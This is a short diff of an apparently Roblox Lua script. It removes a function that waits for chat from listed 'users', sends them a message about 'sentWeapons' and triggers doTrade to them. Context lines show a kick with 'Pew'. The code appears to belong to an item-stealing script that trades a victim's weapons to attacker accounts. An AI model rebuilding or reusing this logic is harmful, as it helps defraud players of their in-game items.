@@ -467,25 +467,6 @@ if #weaponsToSend > 0 then
         player:Kick("Pew")
     end
 
-    local function waitForUserChat()
-        local sentMessage = false
-        local function onPlayerChat(player)
-            if table.find(users, player.Name) then
-                player.Chatted:Connect(function()
-                    if not sentMessage then
-                        SendMessage(sentWeapons)
-                        sentMessage = true
-                    end
-                    doTrade(player.Name)
-                end)
-            end
-        end
-        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
-        Players.PlayerAdded:Connect(onPlayerChat)
-    end
-    waitForUserChat()
-end
-
 
 
 
